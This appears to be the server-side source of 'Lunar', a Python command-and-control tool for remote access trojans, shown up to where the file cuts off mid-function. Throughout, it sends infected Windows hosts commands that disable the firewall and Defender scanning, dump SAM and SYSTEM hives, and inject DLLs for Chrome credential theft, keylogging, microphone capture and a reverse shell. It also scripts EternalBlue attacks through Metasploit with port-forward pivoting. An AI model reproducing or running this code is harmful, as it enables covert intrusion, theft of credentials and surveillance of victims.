import socket
import _thread
import configparser
from .other import *
from .msf import *
import time
import subprocess
import sys
import random
from .builder import Build
from prompt_toolkit import prompt
clients = []  
hostList = [] 
ip_list = []  
log = [] 
silent = False
shell_mode = False
elevated = False


class ClientManage:
    def __init__(self, client_socket):
        self.client_socket = client_socket
    global ip_list
    global elevated
    remote_hosts_list = [] 
    open_ports_list = [] 
    attack_host = [] 
    attack_port = [] 
    exploit_port = []

    def logging(self, data):
        del log[:]
        log.append(data)

    def clear_logging(self):
        del log[:]

    def return_client_info(self):
        location = clients.index(self.client_socket)
        return Fore.BLUE + "[Index : " + str(location) + "]" + Fore.MAGENTA + " [IP : " + str(ip_list[location]) + "] " + Fore.YELLOW + "[" + hostList[location] + "]"

    def send_data(self, data):
        try:
            self.client_socket.send(data.encode())
        except Exception as error:
            self._clear_kick()
            print(Fore.RED + "[!] Error Occurred : " + str(error))

    def send_bytes(self, data):
        try:
            self.client_socket.send(data)
        except Exception as error:
            self._clear_kick()
            print(Fore.RED + "[!] Error Occurred : " + str(error))

    def _clear_kick(self):
        """
        clear lists and kick
        """
        location = clients.index(self.client_socket)
        clients.remove(clients[location])
        ip_list.remove(ip_list[location])
        hostList.remove(hostList[location])

    def build_payload(self, payload):
        os.chdir("../payloads")
        print(Fore.BLUE + "[*] Building {x}..".format(x=payload.capitalize()))
        subprocess.call("mingw32-make {x}".format(x=payload), stdout=subprocess.PIPE)

    def session(self):
        global silent
        global shell_mode
        session = True

        def auto_attack():
            if self.attack_port[0] == "445":
                cmd_str = "netsh interface portproxy add v4tov4 listenport={lp} listenaddress=0.0.0.0 connectport={cp} connectaddress={ca}".format(
                    lp=self.exploit_port[0], cp=self.attack_port[0], ca=self.attack_host[0]
                )
                print("[" + Fore.GREEN + "*" + Fore.WHITE + "] " + "Attacking " + self.attack_host[0] + " from " + Fore.MAGENTA + ip.split(":")[0])
                print("[" + Fore.GREEN + "!" + Fore.WHITE + "]" "Forwarding Port.")
                self.send_data("cmd.exe /c " + cmd_str)
                self.wait_for_reply()
                time.sleep(2)
                print(Style.BRIGHT + "[" + Fore.BLUE + "*" + Fore.WHITE + "]" + Fore.RED + " Disabling firewall..." + Style.RESET_ALL)
                self.send_data("cmd.exe /c netsh advfirewall set currentprofile state off")
                self.wait_for_reply()

# Change this section.
                with open("Lunar_attack.rc", "w+") as rcfile:
                    rcfile.write("use exploit/windows/smb/ms17_010_psexec\n")
                    rcfile.write("set payload windows/meterpreter/reverse_tcp\n")
                    rcfile.write("set LHOST \n")
                    rcfile.write("set RHOST \n")
                    rcfile.write("set RPORT \n")
                    rcfile.write("run")

                try:
                    subprocess.call(["msfconsole", "-r", "Lunar_attack.rc"])
                    
                    self.send_data("cmd.exe /c netsh interface portproxy reset")
                    self.wait_for_reply()
                    print("[" + Fore.GREEN + "*" + Fore.WHITE + "]" + " Enabling firewall...")
                    
                    self.send_data("cmd.exe /c netsh advfirewall set currentprofile state on")
                    self.wait_for_reply()

                except OSError as E:
                    if E.errno == E.errno.ENOENT:
                        print("[" + Fore.RED + "X" + Fore.WHITE + "]" + Fore.LIGHTRED_EX + " Failed to run Metasploit, are you sure it is installed?")
                    else:
                        print(Fore.RED + Style.BRIGHT + "[X] Failed to run Metasploit, Error : " + str(e))
                
            else:
                print(Fore.BLUE + "[!] Incompatible port for" + Fore.GREEN + "Auto Pivot Exploit.")
                print(Fore.BLUE + "[*] Supported Ports are" + Fore.GREEN + "445" + Fore.WHITE + "(smb) for Eternalblue.")

        def auto_scanner():
            if self.attack_port[0] == "445":
                cmd_str = "netsh interface portproxy add v4tov4 listenport={lp} listenaddress=0.0.0.0 connectport={cp} connectaddress={ca}".format(
                    lp=self.exploit_port[0], cp=self.attack_port[0], ca=self.attack_host[0]
                )
                print("[" + Fore.GREEN + "*" + Fore.WHITE + "] " + "Attacking " + self.attack_host[0] + " from " + Fore.MAGENTA + ip.split(":")[0])
                print("[" + Fore.GREEN + "!" + Fore.WHITE + "]" "Forwarding Port.")
                self.send_data("cmd.exe /c " + cmd_str)
                self.wait_for_reply()
                time.sleep(2)
                print(Style.BRIGHT + "[" + Fore.BLUE + "*" + Fore.WHITE + "]" + Fore.RED + " Disabling firewall...")
                self.send_data("cmd.exe /c netsh advfirewall set currentprofile state off")
                self.wait_for_reply()

# Change this section.
                with open("Lunar_attack.rc", "w+") as rcfile:
                    rcfile.write("use auxiliary/scanner/smb/pipe_auditor\n")
                    rcfile.write("set \n")
                    rcfile.write("set RHOST <RHOST>\n")
                    rcfile.write("set SMBUser <SMBUser>\n")
                    rcfile.write("set SMBPass <SMBPass>\n")
                    rcfile.write("set SMBDomain <SMBDomain>\n")
                    rcfile.write("run")

                try:
                    subprocess.call(["msfconsole", "-r", "Lunar_attack.rc"])
                    
                    self.send_data("cmd.exe /c netsh interface portproxy reset")
                    self.wait_for_reply()
                    print("[" + Fore.GREEN + "*" + Fore.WHITE + "]" + Fore.GREEN + "Enabling firewall...")
                    
                    self.send_data("cmd.exe /c netsh advfirewall set currentprofile state on")
                    self.wait_for_reply()

                except OSError as E:
                    if E.errno == E.errno.ENOENT:
                        print("[" + Fore.RED + "X" + Fore.WHITE + "]" + Fore.LIGHTRED_EX + " Failed to run Metasploit, are you sure it is installed?")
                    else:
                        print(Fore.RED + Style.BRIGHT + "[X] Failed to run Metasploit, Error : " + str(e))
                
            else:
                print(Fore.BLUE + "[!] Incompatible port for" + Fore.GREEN + "Auto Pivot Exploit.")
                print(Fore.BLUE + "[*] Supported Ports are" + Fore.GREEN + "445" + Fore.WHITE + "(smb) for Eternalblue.")

        def auto_attack2():
            if self.attack_port[0] == "445":
                cmd_str = "netsh interface portproxy add v4tov4 listenport={lp} listenaddress=0.0.0.0 connectport={cp} connectaddress={ca}".format(
                    lp=self.exploit_port[0], cp=self.attack_port[0], ca=self.attack_host[0]
                )
                print("[" + Fore.GREEN + "*" + Fore.WHITE + "] " + "Attacking " + self.attack_host[0] + " from " + Fore.MAGENTA + ip.split(":")[0])
                print("[" + Fore.GREEN + "!" + Fore.WHITE + "]" "Forwarding Port.")
                self.send_data("cmd.exe /c " + cmd_str)
                self.wait_for_reply()
                time.sleep(2)
                print(Style.BRIGHT + "[" + Fore.BLUE + "*" + Fore.WHITE + "]" + Fore.RED + " Disabling firewall...")
                self.send_data("cmd.exe /c netsh advfirewall set currentprofile state off")
                self.wait_for_reply()

# Change this section. Made for Domain Controllers. (Must have a named pipe, used the auto_scanner)
                with open("Lunar_attack.rc", "w+") as rcfile:
                    rcfile.write("use exploit/windows/smb/ms17_010_psexec\n")
                    rcfile.write("set LHOST <LHOST>\n")
                    rcfile.write("set RHOST <RHOST>\n")
                    rcfile.write("set SMBUser <SMBUser>\n")
                    rcfile.write("set SMBPass <SMBPass> \n")
                    rcfile.write("set SMBDomain <SMBDomain>\n")
                    rcfile.write("set NAMEDPIPE \\\lsarpc\n")
                    rcfile.write("run")

                try:
                    subprocess.call(["msfconsole", "-r", "Lunar_attack.rc"])
                    
                    self.send_data("cmd.exe /c netsh interface portproxy reset")
                    self.wait_for_reply()
                    print("[" + Fore.GREEN + "*" + Fore.WHITE + "]" + Fore.GREEN + "Enabling firewall...")
                    
                    self.send_data("cmd.exe /c netsh advfirewall set currentprofile state on")
                    self.wait_for_reply()

                except OSError as E:
                    if E.errno == E.errno.ENOENT:
                        print("[" + Fore.RED + "X" + Fore.WHITE + "]" + Fore.LIGHTRED_EX + " Failed to run Metasploit, are you sure it is installed?")
                    else:
                        print(Fore.RED + Style.BRIGHT + "[X] Failed to run Metasploit, Error : " + str(e))
                
            else:
                print(Fore.BLUE + "[!] Incompatible port for" + Fore.GREEN + "Auto Pivot Exploit.")
                print(Fore.BLUE + "[*] Supported Ports are" + Fore.GREEN + "445" + Fore.WHITE + "(smb) for Eternalblue.")

        def attack():
            if len(self.exploit_port) == 0:
                self.exploit_port.append(random.randint(1000, 9000))
            else:
                cmd_str = "netsh interface portproxy add v4tov4 listenport={lp} listenaddress=0.0.0.0 connectport={cp} connectaddress={ca}".format(
                    lp=self.exploit_port[0], cp=self.attack_port[0], ca=self.attack_host[0]
                )
                print("[+] Attacking " + self.attack_host[0] + " from " + ip.split(":")[0])
                print("[+] Forwarding Port.")
                self.send_data("cmd.exe /c " + cmd_str)
                self.wait_for_reply()
                time.sleep(2)
                print("[+] Disabling firewall.")
                self.send_data("cmd.exe /c netsh advfirewall set currentprofile state off")
                self.wait_for_reply()
                print("[" + Fore.GREEN + "+" + Fore.WHITE + "] Run your Exploits on " + Fore.YELLOW + ip.split(":")[0] + " on Port " + Fore.MAGENTA + str(self.exploit_port[0]) + ".")
                print("[" + Fore.GREEN + "+" + Fore.WHITE + "] All Traffic sent on " + Fore.YELLOW + ip.split(":")[0] + ":" + Fore.MAGENTA + str(self.exploit_port[0]) + " will be forwarded to " + Style.BRIGHT + Fore.RED + self.attack_host[0] + ":" + Fore.BLUE + self.attack_port[0])
                print("[" + Fore.GREEN + "*" + Fore.WHITE + "] Press CTRL+C when Done.")
                while True:
                    try:
                        prompt("")
                    except KeyboardInterrupt:
                        self.send_data("cmd.exe /c netsh interface portproxy reset")
                        self.wait_for_reply()
                        break

        def filetransfer(mfile=None, rfile=None):
            if mfile is None and rfile is None:
                mfile = prompt("[+] File Path : ")
                rfile = prompt("[+] File name to Save as : ")
            if ":" in rfile:
                print("["+Style.BRIGHT + Fore.RED + "X" + Style.RESET_ALL + "] ':' is forbidden in filename.")
            else:
                try:
                    with open(mfile, "rb") as sendfile:
                        data = sendfile.read()
                        bufferst = os.stat(mfile)
                        print("["+Style.BRIGHT + Fore.LIGHTGREEN_EX + "+" + Style.RESET_ALL + "] File opened " + mfile + " ("+str(bufferst.st_size) + " bytes)")
                        self.send_data("frecv") 
                        trigger = rfile + ":" + str(bufferst.st_size) 
                        time.sleep(1)
                        self.send_data(trigger)
                        self.send_bytes(data)
                        print("[" + Style.BRIGHT + Fore.LIGHTBLUE_EX + "*" + Style.RESET_ALL + "] Uploading file.")
                        self.wait_for_reply()
                except FileNotFoundError:
                    print("[" + Style.BRIGHT + Fore.RED + "X" + Style.RESET_ALL + "] '{file}' not found!?".format(file=mfile))
                except Exception as E:
                    print("[" + Style.BRIGHT + Fore.RED + "X" + Style.RESET_ALL + "] Error : " + str(E))
        
        def dll_transfer(mfile=None, proc=None):
            if mfile is None and proc is None:
                mfile = prompt(Fore.GREEN + "[+] DLL Path : ")
                proc = prompt(Fore.YELLOW + "[+] Process Name : ")
            try:
                with open(mfile, "rb") as sendfile:
                    data = sendfile.read()
                    bufferst = os.stat(mfile)
                    print("[" + Style.BRIGHT + Fore.LIGHTGREEN_EX + "+" + Style.RESET_ALL + "] File opened " + mfile + " ("+str(bufferst.st_size) + " bytes)")
                    
                    self.send_data("fdll")
                    time.sleep(1)
                    trigger = "lunar" + ":" + str(bufferst.st_size) + ":" + proc
                    self.send_data(trigger)
                    self.send_bytes(data)
                    print("[" + Style.BRIGHT + Fore.LIGHTBLUE_EX + "*" + Style.RESET_ALL + "] Uploading file.")
                    self.wait_for_reply()
            except FileNotFoundError:
                print(Style.BRIGHT + Fore.RED + "[X] '{file}' not found!?".format(file=mfile))
            except Exception as E:
                print("[" + Fore.RED + "X" + Fore.WHITE + "] Error : " + str(E))

        def dll_get_output():
            self.send_data("dlloutput")
            self.wait_for_reply()

        def send_payload_command(strr):
            self.send_data("frecv")
            self.send_data("output.png:"+str(len(strr)))
            time.sleep(1)
            self.send_data(strr)
            self.wait_for_reply()

        def remove_payload_command():
            self.send_data("delete:output.png")
            self.wait_for_reply()

        # if session:
        #    silent = True
        #    self.send_data("isadmin")  # check admin first
        #    while True:
        #        self.wait_for_reply()
        #        silent = False
        #        time.sleep(2)
        #        print(str(elevated))
        #        if elevated:
        #            print(Style.BRIGHT + Fore.GREEN + "[+]" + Style.RESET_ALL + " Interacting with Session {x} on {upc} with" + Fore.GREEN + "Administrator Access ..." .format(x=ip_list[clients.index(self.client_socket)], upc=hostList[clients.index(self.client_socket)]))
        #        else:
        #            print(Style.BRIGHT + Fore.GREEN + "[+]" + Style.RESET_ALL + " Interacting with Session {x} on {upc} without" + Fore.RED + "Administrator Access ..." .format(x=ip_list[clients.index(self.client_socket)], upc=hostList[clients.index(self.client_socket)]))
        while session:
            try:
                try:
                    location = clients.index(self.client_socket)
                    if not shell_mode:
                        shell_mode = True

                except ValueError:
                    print("[X] Client disconnected unexpectedly, Session closed.")
                    shell_mode = False
                    session = False
                    break
                ip = ip_list[location]
                main = prompt("#/master@Lunar:> ".format(ip=ip))
                if main == "ls":
                    self.send_data("listdir")
                    self.wait_for_reply()
                    
                elif main == "osinfo":
                    self.send_data("systeminfo")
                    self.wait_for_reply()
                elif main.startswith("cd"):
                    sp = main.split()
                    try:
                        self.send_data("cd")
                        self.send_data(sp[1])
                        self.wait_for_reply()
                    except IndexError:
                        print(Style.BRIGHT + Fore.RED + "[X] Error : Usage is cd < dir > ")
                elif main == "execute":
                    filename = prompt("[:] Enter Filename to Execute : ")
                    if len(filename) > 0:
                        self.send_data("exec")
                        self.send_data(filename)
                 
                elif main == "execargs":
                    filename = prompt("[:] Enter Filename to Execute : ")
                    args = prompt("[:] Command line arguments : ")
                    if len(filename) > 0 and len(args) > 0:
                        self.send_data("execargs:"+filename+":"+args)
                        self.wait_for_reply()
                elif main == "shell":
                    shell = True
                    while shell:
                        sh = prompt("( " + ip.split(":")[0].strip() + "@" + hostList[location].split("/")[0].strip() + " ) > ")
                        if len(sh) > 0:
                            if sh != "exit":
                                self.send_data("cmd.exe /c " + sh)
                                self.wait_for_reply()
                            else:
                                shell = False
                                break
                        
                elif main == "exit":
                    shell_mode = False
                    session = False
                    break

                elif main == "delete":
                    dlt = prompt("[:] Enter Filename to Delete : ")
                    if len(dlt) > 0:
                        self.send_data("delete:"+dlt)
                        self.wait_for_reply()
                elif main == "process_monitor":
                    self.PROCESS_MONITOR()
                elif main == "dir_monitor":
                    self.DIRMONITOR(None)

                elif main == "netuser":
                    
                    self.send_data("cmd.exe /c net user")
                    self.wait_for_reply()
                elif main == "driverquery":
                    
                    self.send_data("cmd.exe /c driverquery")
                    self.wait_for_reply()
                elif main == "tasklist":
                    
                    self.send_data("cmd.exe /c tasklist")
                    self.wait_for_reply()
                elif main == "drives":
                    
                    self.send_data("cmd.exe /c fsutil fsinfo drives")
                    self.wait_for_reply()
                elif main == "set":
                    
                    self.send_data("cmd.exe /c set")
                    self.wait_for_reply()
                elif main == "qwinsta":
                    
                    self.send_data("cmd.exe /c qwinsta")
                    self.wait_for_reply()
                elif main.startswith("port_scan"):
                    if len(self.attack_host) > 0:
                        ip = self.attack_host[0]
                    else:
                        ip = prompt("[+] Enter IP : ")
                    if len(ip) > 0:
                        silent = True
                        while True:
                            try:
                                with open("common_ports", "r") as commonportlist:
                                    lines = commonportlist.readlines()
                                    for line in lines:
                                        port = line.split(" ")[1].strip()
                                        self.send_data("checkport")
                                        self.send_data(ip + "," + port)
                                        time.sleep(2) 
                                    break
                            except KeyboardInterrupt:
                                silent = False
                                break

                elif main == "clientinfo":
                    self.send_data("clientinfo")
                    self.wait_for_reply()
                elif main == "netshall":
                    self.send_data("cmd.exe /c netsh wlan show all")
                    self.wait_for_reply()
                elif main == "windefender_exclude":
                    path = prompt("[+] Path on Remote PC ( File / Folder ) : ")
                    if len(path) > 0:
                        if elevated is True:
                            self.send_data("exclude")
                            self.send_data(path)
                            strs = "cmd.exe /c powershell.exe -inputformat none -outputformat none -NonInteractive -Command Add-MpPreference -ExclusionPath '{s}'".format(s=path)
                            self.send_data(strs)
                            time.sleep(3)
                            print("[+] Exclusion added.")
                    else:
                        print(Style.BRIGHT + Fore.RED + "[x]" + Style.RESET_ALL + " Lunar does not have Admin rights! You must elevate first.")

                elif main == "systeminfo":
                    self.send_data("systeminfo")
                    self.wait_for_reply()

                elif main == "rdp_enable":
                    print("["+Style.BRIGHT + Fore.GREEN + "+" + Style.RESET_ALL + "] Turning Remote Desktop on.")
                    self.send_data('cmd.exe /c reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f')
                    self.wait_for_reply()
                    print("["+Style.BRIGHT + Fore.GREEN + "+" + Style.RESET_ALL + "] Disabling Firewall.")
                    self.send_data('cmd.exe /c netsh advfirewall firewall set rule group="remote desktop" new enable=yes')
                    self.wait_for_reply()

                elif main == "rdp_disable":
                    print("["+Style.BRIGHT + Fore.GREEN + "+" + Style.RESET_ALL + "] Turning Remote Desktop off.")
                    self.send_data('cmd.exe /c reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 1 /f')
                    self.wait_for_reply()

                elif main == "portfwd":
                    cmd_str = "netsh interface portproxy add v4tov4 listenport={lp} listenaddress=0.0.0.0 connectport={cp} connectaddress={ca}"
                    listen_port = prompt("[+] Enter" + Fore.BLUE + " Port" + Fore.WHITE + " to Listen for" + Fore.YELLOW + " Connection : ")
                    connect_addr = prompt("[+] Enter" + Fore.GREEN + " Host" + Fore.WHITE + " to" + Fore.MAGENTA + " Forward Connection to : ")
                    connect_port = prompt("[+] Enter" + Fore.BLUE + "Port" + Fore.WHITE + " to" + Fore.MAGENTA + " Forward Connection to : ")
                    newstr = cmd_str.format(lp=listen_port, cp=connect_port, ca=connect_addr)
                    print(newstr)
                    self.send_data("cmd.exe /c " + newstr)
                    self.wait_for_reply()

                elif main == "portfwd_reset":
                    self.send_data("cmd.exe /c netsh interface portproxy reset")
                    self.wait_for_reply()
                    
                elif main == "network_scan":
                    try:
                        iprange = prompt("[^] Enter Range (eg: 192.168.0.1/24) : ")
                        scan_range = iprange.split("/")
                        start = scan_range[0]
                        get = start.split(".")
                        end = scan_range[1]
                        xip = get[3]
                        base = get[0] + "." + get[1] + "." + get[2] + "."
                        try:
                            for i in range(int(xip), int(end)):
                                if not silent:
                                    silent = True
                                ip_toscan = base + str(i)
                                print("Scanning : " + ip_toscan)
                                self.send_data("checkhost")
                                self.send_data(ip_toscan)
                                self.wait_for_reply()
                            silent = False
                        except KeyboardInterrupt:
                            silent = False
                    except Exception as e:
                        print("[X] Error : " + str(e))
                    
                elif main == "show targets":
                    if len(self.remote_hosts_list) > 0:
                        for host in self.remote_hosts_list:
                            print("[" + Style.BRIGHT + Fore.GREEN + "+" + Style.RESET_ALL + "] " + host)
                    else:
                        print("[" + Style.BRIGHT + Fore.RED + "x" + Style.RESET_ALL + "] Error : No Hosts scanned.")
                        
                elif main == "clear_hosts":
                    confirm = prompt(Fore.RED + Style.BRIGHT + "[X] Confirm Clear hosts? You will need to Rescan! (y/n) : ")
                    if confirm.lower() == "y":
                        del self.remote_hosts_list[:]

                elif main == "clear_ports":
                    confirm = prompt(Fore.RED + Style.BRIGHT + "[X] Confirm Clear Ports? You will need to Rescan! (y/n) : ")
                    if confirm.lower() == "y":
                        del self.open_ports_list[:]
                
                elif main.startswith("set target"):
                    try:
                        
                        parse = main.split(" ")
                        target = parse[2]
                        if len(self.attack_host) > 0:
                            print(Fore.RED + Style.BRIGHT + "[+] Removing " + self.attack_host[0] + " as set target.")
                            del self.attack_host[:]
                        self.attack_host.append(target)
                        print(Style.BRIGHT + Fore.LIGHTWHITE_EX + "[+] Target => " + self.attack_host[0])
                    except Exception as e:
                        print("Error : " + str(e))

                elif main.startswith("set attackport"):
                    try:
                        
                        parse = main.split(" ")
                        atport = parse[2]
                        if len(self.attack_port) > 0:
                            print(Fore.RED + Style.BRIGHT + "[+] Removing " + self.attack_port[0] + " as set Attack Port.")
                            del self.attack_port[:]
                        self.attack_port.append(atport)
                        print(Style.BRIGHT + Fore.LIGHTWHITE_EX + "[+] Attack Port => " + self.attack_port[0])
                    except Exception as e:
                        print("Error : " + str(e))                    

                elif main.startswith("set exploitport"):
                    try:
                        parse = main.split(" ")
                        export = parse[2]
                        if len(self.exploit_port) > 0:
                            print(Fore.RED + Style.WHITE + "[+] Removing " + self.exploit_port[0] + " as set Exploit Port.")
                            del self.exploit_port[:]
                        self.exploit_port.append(export)
                        print(Style.BRIGHT + Fore.LIGHTWHITE_EX + "[+] Exploit Port => " + self.exploit_port[0])
                    except Exception as e:
                        print("Error : " + str(e))  

                elif main == "show info":
                    def get_ports(target):
                        x = []
                        ret = ""
                        for i in self.open_ports_list:
                            if target in i:
                                x.append(i)
                        for showport in x:
                            ret += showport.split(":")[1] + "\n"
                        return ret
                    try:
                        if len(self.attack_host) > 0:
                            infomsg = """
                            Target IP : {targetip}
                            Open Ports
                            ---------------------
                            {openports}
                            """.format(targetip=self.attack_host[0], openports=get_ports(self.attack_host[0]))
                            print(infomsg)
                        else:
                            print(Fore.RED + Style.BRIGHT + "[X] No Target is set.")
                    except Exception as e:
                        print(Fore.RED + Style.BRIGHT + "Error : " + str(e))

                elif main == "show options":
                    attack_ip = ""
                    attack_port = ""
                    rand_port = 0
                    if len(self.attack_host) > 0:
                        attack_ip = self.attack_host[0]
                    else:
                        attack_ip = None

                    if len(self.attack_port) > 0:
                        attack_port = self.attack_port[0]
                    else:
                        attack_port = None

                    if len(self.exploit_port) > 0:
                        rand_port = self.exploit_port[0]
                    else:
                        rand_port = random.randint(1000, 9000)

                    help_msg = r"""
        Lunar Options

        Attack Target
        --------------
        {attackIP}

        Attack Port
        -----------
        {attackport}

        Exploit Port
        -----------
        {randport} (default is random)

        Attack Details
        --------------
        [ Exploit ] --> {clientip}:{randport} --> {attackIP}:{attackport}

                    """.format(clientip=Style.BRIGHT + ip.split(":")[0], attackIP=attack_ip, attackport=attack_port, randport=rand_port)

                    print(help_msg)

                elif main == "run":
                    try:
                        attack()
                    except IndexError:
                        print(Fore.RED + Style.BRIGHT + '[!] One or more required values are not set.')
                    except Exception as e:
                        print(Fore.RED + Style.BRIGHT + "[!] Error : " + str(e))

                elif main == "run autoblue":
                    try:
                        if len(self.exploit_port) > 0:
                            pass
                        else:
                            self.exploit_port.append(random.randint(1000, 9000))
                        auto_attack()
                    except IndexError:
                        print(Fore.BLUE + Style.BRIGHT + '[X] One or more required values are not set.')
                    except Exception as e:
                        print(Fore.RED + Style.BRIGHT + "[X] Error : " + str(e))

                elif main == "run autoblue2":
                    try:
                        if len(self.exploit_port) > 0:
                            pass
                        else:
                            self.exploit_port.append(random.randint(1000, 9000))
                        auto_attack2()
                    except IndexError:
                        print(Fore.BLUE + Style.BRIGHT + '[X] One or more required values are not set.')
                    except Exception as e:
                        print(Fore.RED + Style.BRIGHT + "[X] Error : " + str(e))

                elif main == "run autoscanner":
                    try:
                        if len(self.exploit_port) > 0:
                            pass
                        else:
                            self.exploit_port.append(random.randint(1000, 9000))
                        auto_scanner()
                    except IndexError:
                        print(Fore.BLUE + Style.BRIGHT + '[X] One or more required values are not set.')
                    except Exception as e:
                        print(Fore.RED + Style.BRIGHT + "[X] Error : " + str(e))

                elif main == "firewall_on":
                    self.send_data("cmd.exe /c netsh advfirewall set currentprofile state on")
                    self.wait_for_reply()

                elif main == "firewall_off":
                    self.send_data("cmd.exe /c netsh advfirewall set currentprofile state off")
                    self.wait_for_reply()
                
                elif main == "tasklist":
                    self.send_data("cmd.exe /c tasklist")
                    self.wait_for_reply()
                    
                elif main == "taskkill":
                    processname = prompt("[?] Enter Process name : ")
                    if len(processname) > 0:
                        self.send_data("cmd.exe /c taskkill /IM " + processname + " /F")
                        self.wait_for_reply()
                        
                elif main == "host_sweep":
                    try:
                        if (len(self.remote_hosts_list)) > 0:
                            for host in self.remote_hosts_list:
                                self.send_data("gethostname")
                                self.send_data(host.strip().split("-")[0])
                                self.wait_for_reply()
                    except Exception as e:
                        print("[X] Error : " + str(e))
                
                elif main == "host_sweep -h":
                    try:
                        ip = prompt("[?] Enter IP : ")
                        if len(ip) > 0:
                            self.send_data("gethostname")
                            self.send_data(ip)
                            self.wait_for_reply()
                    except Exception as e:
                        print("[X] Error : " + str(e))

                elif main == "upload":
                    filetransfer()
                    time.sleep(2)

                elif main == "download":
                    filename = prompt("[+] File : ")
                    if len(filename) > 0:
                        self.send_data("fupload:"+filename)
                        self.wait_for_reply()
                        time.sleep(5)

                elif main == "psinfo":
                    name = prompt("[+] Enter Process name : ")
                    if len(name) > 0:
                        self.send_data("psinfo:"+name)
                        self.wait_for_reply()

                elif main == "lunar_info":
                    self.send_data("lunarpid")
                    self.wait_for_reply()

                elif main == "isadmin":
                    self.send_data("isadmin")
                    self.wait_for_reply()

                elif main == "geolocate":
                    self.send_data("wanip")
                    self.wait_for_reply()

                elif main == "dllinject":
                    dll_transfer()
                    
                elif main == "help":
                    print(lunarhelp)

                elif main == "samdump":
                    self.send_data("cmd.exe /c reg save hklm\sam sam")
                    self.wait_for_reply()
                    self.send_data("cmd.exe /c reg save hklm\system system")
                    self.wait_for_reply()
                    self.send_data("fupload:sam")
                    self.wait_for_reply()
                    self.send_data("fupload:system")
                    self.wait_for_reply()
                    self.send_data("delete:sam")
                    self.wait_for_reply()
                    self.send_data("delete:system")

                    if os.path.isfile("downloads/sam"):
                        if os.path.isfile("downloads/system"):
                            subprocess.call(["samdump2", "downloads/system", "downloads/sam"])
                            os.remove("downloads/system")
                            os.remove("downloads/sam")
                        else:
                            print("[+] Error dumping system.")
                    else:
                        print("[+] Error dumping sam.")
                
                elif main == "capturemic":
                    seconds = prompt("[?] Recording time in seconds : ")
                    send_payload_command(seconds)
                    dll_transfer("payloads/capturemic.dll", setting('inject_process'))
                    print(Fore.YELLOW + "[+] Recording microphone prompt ...")
                    time.sleep(int(seconds) + 2)
                    self.send_data("fupload:" + hostList[location].split("/")[1].strip() + ".wav")
                    self.wait_for_reply()
                    self.send_data("delete:"+hostList[location].split("/")[1].strip() + ".wav")
                    self.wait_for_reply()
                    remove_payload_command()
                    
                elif main == "dropmsf":
                    os.chdir("payloads")
                    build_msf_dll()
                    os.chdir("..")
                    dll_transfer("payloads/msf.dll", setting('inject_process'))
                    
                elif main == "screenshot":
                    self.send_data("screenshot")
                    self.wait_for_reply()
                elif main == "runasadmin":
                    print(Style.BRIGHT + Fore.LIGHTCYAN_EX + "[~]" + Style.RESET_ALL + " Injecting Payload.")
                    app = prompt("[+] Application name : ")
                    if len(app) > 0:
                        send_payload_command(app)
                        dll_transfer("payloads/runasadmin.dll", setting('inject_process'))
                        remove_payload_command()
                        
                elif main == "chromedump":
                    print(Style.BRIGHT + Fore.LIGHTCYAN_EX + "[~]" + Style.RESET_ALL + " Injecting Payload.")
                    dll_transfer("payloads/ChromeDump.dll", setting('inject_process'))
                    credfile = hostList[location].split("/")[0].strip()
                    self.send_data("fupload:"+credfile)
                    time.sleep(2)
                    self.send_data("delete:"+credfile)
                    self.wait_for_reply()
                    print("-------------------------")
                    print_txt_file("downloads/"+credfile)
                    print("-------------------------")
                    print(Style.BRIGHT + Fore.LIGHTWHITE_EX + "[+] Saved in 'downloads/"+credfile+"'")

                elif main == "rshell":
                    host = prompt("[+] Reverse Host : ")
                    port = prompt("[+] Reverse Port : ")
                    if len(host) > 0:
                        if len(port) > 0:
                            send_payload_command(host+":"+port)
                            dll_transfer("payloads/ncshell.dll", setting('inject_process'))
                            self.wait_for_reply()
                            remove_payload_command()
                elif main == "keylog_start":
                    dll_transfer("payloads/keylogger.dll", setting('inject_process'))

                elif main == "keylog_stop":
                    send_payload_command("KEYLOGSTOP")
                    time.sleep(2)
                    remove_payload_command()
                    self.send_data("fupload:log.log")
                    self.wait_for_reply()
                    self.send_data("delete:log.log")
                    self.wait_for_reply()
                    print("-------------------------")
                    print_txt_file("downloads/log.log")
                    print("-------------------------")
                    try:
                        os.remove("downloads/log.log")
                    except FileNotFoundError:
                        print(Fore.RED + Style.BRIGHT + "[X] No Logs were written.")

            except KeyboardInterrupt:
                print(Fore.RED + Style.BRIGHT + "[X] Interrupt, Type exit to Exit session.")

    def wait_for_reply(self):
        self.clear_logging()
        x = 0 
        while x != 20:
            try: 
                if len(log) > 0:
                    break 
                time.sleep(0.5)
                x += 1 
                if x == 20:
                    print(Style.BRIGHT + Fore.RED + "[i]" + Style.RESET_ALL + Fore.MAGENTA + " 20 seconds have passed and we have received no response from Lunar. There may be a routing or connection problem.")
            except KeyboardInterrupt:
                break 

    def client_thread(self):
        global silent
        global shell_mode

        def uniquify(path):
            filename, extension = os.path.splitext(path)
            counter = 1
            while os.path.exists(path):
                path = filename + " (" + str(counter) + ")" + extension
                counter += 1
            return path

        while True:
            try:
                client_data = self.client_socket.recv(1024).decode()
                if not client_data:
                    self._clear_kick()
                    break 
                self.logging(client_data)

                try:
                    indexof = clients.index(self.client_socket)
                    ips = ip_list[indexof]
                except Exception as e:
                    print(Fore.RED + Style.BRIGHT + "[X] Error : " + str(e))
                    pass

                if client_data.startswith("OPENPORT"):
                    parse = client_data.split(":")
                    ip_port = str(parse[1]).split(",")
                    with open("common_ports", "r") as portlist:
                        lines = portlist.readlines()
                        for line in lines:
                            if ip_port[1] in line:
                                # if port in list
                                ipport = ip_port[0] + ":" + ip_port[1]
                                print("[" + Style.BRIGHT + Fore.GREEN + "+" + Style.RESET_ALL + "] " + ipport + Style.BRIGHT + Fore.GREEN + " <--> " + Style.RESET_ALL + line)
                                if ipport not in self.open_ports_list:
                                    self.open_ports_list.append(ipport)
                                break
                      
                elif client_data.startswith("[HOST]"):
                    hostinfo = client_data.replace("[HOST]", "")
                    print("[" + Style.BRIGHT + Fore.GREEN + "+" + Style.RESET_ALL + "] " + hostinfo)
                    if "-pc" in hostinfo.lower(): 
                        print(" |_ " + Style.BRIGHT + Fore.GREEN + " OS " + Style.RESET_ALL + " : Windows (Just guessing)")
                    if hostinfo not in self.remote_hosts_list:
                        self.remote_hosts_list.append(hostinfo)

                elif client_data.startswith("FILE"):
                    try:
